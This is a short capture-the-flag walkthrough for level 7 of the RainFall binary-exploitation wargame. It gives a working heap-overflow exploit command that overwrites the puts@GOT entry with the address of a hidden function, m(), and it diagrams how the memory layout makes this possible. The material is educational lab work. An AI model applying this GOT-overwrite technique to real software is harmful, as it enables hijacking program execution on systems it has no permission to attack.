================================== Level7 Walkthrough ============================================

$(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')


[a[1] buffer 8b][b header 8b][b[0] 4b][b[1] 4b]
  AAAAAAAA        AAAAAAAA     AAAA     puts@GOT
←────────── 20 A's ──────────────────→ ←address→

we used this command to find the address of puts@GOT:
-----------------------------------------------------
level7@RainFall:~$ objdump -R ./level7 | grep puts  |
08049928 R_386_JUMP_SLOT   puts                     |
-----------------------------------------------------

then argv[2] = m() address
→ strcpy(puts@GOT, m())
→ puts@GOT = m() ✅

Later the program executes:

puts("~~");

Normally:

puts@GOT -> real puts

But now:

puts@GOT -> m

so execution becomes:

m();